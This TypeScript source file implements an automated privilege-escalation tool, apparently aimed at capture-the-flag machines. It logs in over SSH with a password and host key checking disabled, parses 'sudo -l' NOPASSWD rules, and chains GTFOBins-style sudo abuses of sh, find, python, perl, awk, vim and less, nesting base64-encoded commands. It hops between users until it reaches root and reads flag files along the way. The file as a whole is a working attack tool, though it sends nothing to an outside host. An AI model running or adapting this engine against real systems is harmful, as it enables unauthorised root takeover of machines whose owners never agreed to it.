import { execFile } from 'node:child_process';

/**
 * Deterministic, rule-based privilege-escalation engine (no LLM in the loop).
 *
 * It SSHes in as the starting user and then walks a privilege chain:
 *   recon -> parse `sudo -l` run-as rules -> hop to the next user via a
 *   GTFOBins primitive -> repeat, horizontally and vertically, until it
 *   reaches root (uid=0) or runs out of hops.
 *
 * Each hop is executed inside the previous user's context by nesting
 * base64-encoded payloads, so no quoting ever breaks regardless of depth.
 *
 * Non-destructive: it only runs `id`, lists sudo rights, enumerates
 * SUID/capabilities, and reads flag files. It never writes or persists
 * anything on the target. Every rule is explicit; nothing is delegated to a model.
 */

export interface CmdResult {
  cmd: string;
  stdout: string;
  stderr: string;
  code: number | null;
}

export interface PrivescReport {
  host: string;
  initialUser: string;
  kernel: string;
  suidBinaries: string[];
  capabilities: string[];
  chain: string[]; // e.g. ['role001','role002','root']
  hops: Array<{ from: string; to: string; via: string; command: string }>;
  rootReached: boolean;
  flags: string[];
  summary: string;
}

// A command executed via `base64 -d` so arbitrary inner commands never
// collide with the outer shell's quoting. {U}=run-as user, {P}=binary path,
// {B}=base64 of the inner command to run as {U}.
type RunAsBuilder = (path: string, user: string, innerB64: string) => string;

const DECODE = (b: string) => `"$(echo ${b} | base64 -d)"`;

// GTFOBins "run a command as another user via sudo" primitives.
const SUDO_RUNAS: Record<string, RunAsBuilder> = {
  sh: (p, u, b) => `sudo -n -u ${u} ${p} -c ${DECODE(b)}`,
  bash: (p, u, b) => `sudo -n -u ${u} ${p} -c ${DECODE(b)}`,
  dash: (p, u, b) => `sudo -n -u ${u} ${p} -c ${DECODE(b)}`,
  ash: (p, u, b) => `sudo -n -u ${u} ${p} -c ${DECODE(b)}`,
  zsh: (p, u, b) => `sudo -n -u ${u} ${p} -c ${DECODE(b)}`,
  env: (p, u, b) => `sudo -n -u ${u} ${p} /bin/sh -c ${DECODE(b)}`,
  find: (p, u, b) =>
    `sudo -n -u ${u} ${p} . -maxdepth 0 -exec sh -c ${DECODE(b)} \\;`,
  python: (p, u, b) =>
    `sudo -n -u ${u} ${p} -c "import base64,os;os.system(base64.b64decode('${b}').decode())"`,
  python2: (p, u, b) =>
    `sudo -n -u ${u} ${p} -c "import base64,os;os.system(base64.b64decode('${b}').decode())"`,
  python3: (p, u, b) =>
    `sudo -n -u ${u} ${p} -c "import base64,os;os.system(base64.b64decode('${b}').decode())"`,
  perl: (p, u, b) =>
    `sudo -n -u ${u} ${p} -e "system('echo ${b} | base64 -d | sh')"`,
  awk: (p, u, b) =>
    `sudo -n -u ${u} ${p} "BEGIN{system(\\"echo ${b} | base64 -d | sh\\")}"`,
  vim: (p, u, b) =>
    `sudo -n -u ${u} ${p} -e -c ':silent !echo ${b} | base64 -d | sh' -c ':q!' /dev/null`,
  less: (p, u, b) =>
    `sudo -n -u ${u} ${p} -e '!echo ${b} | base64 -d | sh' /etc/hostname`,
  tee: (p, u, b) => `sudo -n -u ${u} ${p} -c ${DECODE(b)}`, // fallback shape
};

const FLAG_PATHS = [
  '/root/flag.txt',
  '/root/root.txt',
  '/root/flag',
  '/root/proof.txt',
  '/flag.txt',
  '/flag',
  '/home/*/flag.txt',
  '/home/*/user.txt',
  '/home/*/local.txt',
];

const READ_FLAGS_CMD = `for f in ${FLAG_PATHS.join(
  ' ',
)}; do [ -r "$f" ] && echo "FLAG_FILE:$f=$(cat "$f" 2>/dev/null)"; done`;

const MAX_DEPTH = 10;

function basename(p: string): string {
  return p.split('/').filter(Boolean).pop() ?? p;
}

interface SudoRule {
  user: string; // run-as user (ALL -> root)
  path: string; // command path (or 'sh' for ALL)
  bin: string; // basename
}

export class PrivescEngine {
  private readonly host: string;
  private readonly password: string;

  constructor(opts: { host: string; password: string }) {
    this.host = opts.host;
    this.password = opts.password;
  }

  private sshExec(remoteCommand: string): Promise<CmdResult> {
    const args = [
      '-p',
      this.password,
      'ssh',
      '-o',
      'ConnectTimeout=10',
      '-o',
      'StrictHostKeyChecking=no',
      '-o',
      'UserKnownHostsFile=/dev/null',
      '-o',
      'PreferredAuthentications=password,publickey',
      '-o',
      'LogLevel=ERROR',
      this.host,
      remoteCommand,
    ];

    console.log(`[privesc] ${this.host} $ ${remoteCommand}`);

    return new Promise((resolve) => {
      execFile(
        'sshpass',
        args,
        { timeout: 30_000, maxBuffer: 10 * 1024 * 1024 },
        (err, stdout, stderr) => {
          const code =
            err && typeof (err as { code?: number }).code === 'number'
              ? (err as { code?: number }).code ?? 1
              : err
                ? 1
                : 0;
          if (stdout.trim()) console.log(stdout.trimEnd());
          if (stderr.trim()) console.log(`[privesc:stderr] ${stderr.trimEnd()}`);
          resolve({ cmd: remoteCommand, stdout, stderr, code });
        },
      );
    });
  }

  /** Base64 of an inner command, for nesting. */
  private b64(cmd: string): string {
    return Buffer.from(cmd, 'utf8').toString('base64');
  }

  /** Parse `sudo -l` output into run-as rules (NOPASSWD only, for -n). */
  private parseSudo(output: string): SudoRule[] {
    const rules: SudoRule[] = [];
    for (const line of output.split('\n')) {
      if (!/nopasswd/i.test(line)) continue;
      const m = /\(([^)]+)\)\s*(?:NOPASSWD:\s*)?(.+)$/i.exec(line.trim());
      if (!m) continue;
      const runas = m[1].split(':')[0].trim();
      const user = /^all$/i.test(runas) ? 'root' : runas;
      for (const raw of m[2].split(',')) {
        const cmd = raw.trim().split(/\s+/)[0];
        if (!cmd) continue;
        if (/^all$/i.test(cmd)) {
          rules.push({ user, path: 'sh', bin: 'sh' });
        } else if (cmd.startsWith('/')) {
          rules.push({ user, path: cmd, bin: basename(cmd) });
        }
      }
    }
    return rules;
  }

  private extractFlags(output: string): string[] {
    const flags = new Set<string>();
    for (const line of output.split('\n')) {
      const ff = line.match(/^FLAG_FILE:(\S+)=(.*)$/);
      if (ff && ff[2].trim()) flags.add(`${ff[1]} => ${ff[2].trim()}`);
      const inline = line.match(/\b(flag|FLAG|CTF)\{[^}]+\}/g);
      if (inline) inline.forEach((f) => flags.add(f));
    }
    return [...flags];
  }

  async run(): Promise<PrivescReport> {
    console.log(
      `[privesc] ===== starting privilege-escalation chain on ${this.host} =====`,
    );

    const idRes = await this.sshExec('id');
    const initialUser =
      /uid=\d+\(([^)]+)\)/.exec(idRes.stdout)?.[1] ?? 'unknown';
    const kernel = (await this.sshExec('uname -a')).stdout.trim();
    const suidRaw = (
      await this.sshExec('find / -perm -4000 -type f 2>/dev/null')
    ).stdout.trim();
    const capRaw = (await this.sshExec('getcap -r / 2>/dev/null')).stdout.trim();

    const flags = new Set<string>();
    const hops: PrivescReport['hops'] = [];
    const chain: string[] = [initialUser];
    const visited = new Set<string>([initialUser]);
    const failed = new Set<string>(); // user@bin combos that didn't verify

    // Current execution context: wraps an inner command so it runs as the
    // user we've escalated to so far. Level 0 = the login user (identity).
    let wrap = (cmd: string): string => cmd;
    let currentUser = initialUser;
    let rootReached = /uid=0\(root\)/.test(idRes.stdout);

    // Read flags readable right away.
    const pre = await this.sshExec(READ_FLAGS_CMD);
    this.extractFlags(pre.stdout).forEach((f) => flags.add(f));

    for (let depth = 0; depth < MAX_DEPTH && !rootReached; depth++) {
      const sudoOut = (await this.sshExec(wrap('sudo -n -l 2>&1 || true')))
        .stdout;
      const rules = this.parseSudo(sudoOut);

      // Pick the first rule that reaches an unvisited user via a known primitive.
      const hop = rules.find(
        (r) =>
          SUDO_RUNAS[r.bin] &&
          !visited.has(r.user) &&
          !failed.has(`${r.user}:${r.bin}`),
      );
      if (!hop) {
        console.log(
          `[privesc] no further NOPASSWD hop from '${currentUser}' (rules: ${
            rules.map((r) => `${r.user}:${r.bin}`).join(', ') || 'none'
          })`,
        );
        break;
      }

      const builder = SUDO_RUNAS[hop.bin];
      const prevWrap = wrap;
      const candidateWrap = (cmd: string): string =>
        prevWrap(builder(hop.path, hop.user, this.b64(cmd)));

      // Verify the hop actually changed identity.
      const verifyCmd = candidateWrap('id');
      const verify = await this.sshExec(verifyCmd);
      const landedUser = /uid=\d+\(([^)]+)\)/.exec(verify.stdout)?.[1];

      if (!landedUser || landedUser === currentUser) {
        console.log(
          `[privesc] hop ${currentUser} -> ${hop.user} via ${hop.bin} did not take; trying others`,
        );
        failed.add(`${hop.user}:${hop.bin}`);
        continue;
      }

      console.log(
        `[privesc] >>> hop ${currentUser} -> ${landedUser} via sudo ${hop.bin}`,
      );
      hops.push({
        from: currentUser,
        to: landedUser,
        via: `sudo -u ${hop.user} ${hop.bin}`,
        command: verifyCmd,
      });
      wrap = candidateWrap;
      currentUser = landedUser;
      chain.push(landedUser);
      visited.add(landedUser);
      rootReached = /uid=0\(root\)/.test(verify.stdout);

      // Read flags as the new user.
      const fres = await this.sshExec(wrap(READ_FLAGS_CMD));
      this.extractFlags(fres.stdout).forEach((f) => flags.add(f));
    }

    const summary = rootReached
      ? `ROOT reached on ${this.host}. Chain: ${chain.join(
          ' -> ',
        )}. Flags: ${flags.size ? [...flags].join(' ; ') : 'none readable'}.`
      : `Chain on ${this.host}: ${chain.join(' -> ')}${
          chain.length > 1 ? ' (horizontal escalation)' : ' (no escalation)'
        }. Root not reached. Flags: ${
          flags.size ? [...flags].join(' ; ') : 'none readable'
        }.`;

    console.log(`[privesc] ===== done: ${summary} =====`);

    return {
      host: this.host,
      initialUser,
      kernel,
      suidBinaries: suidRaw ? suidRaw.split('\n').filter(Boolean) : [],
      capabilities: capRaw ? capRaw.split('\n').filter(Boolean) : [],
      chain,
      hops,
      rootReached,
      flags: [...flags],
      summary,
    };
  }
}
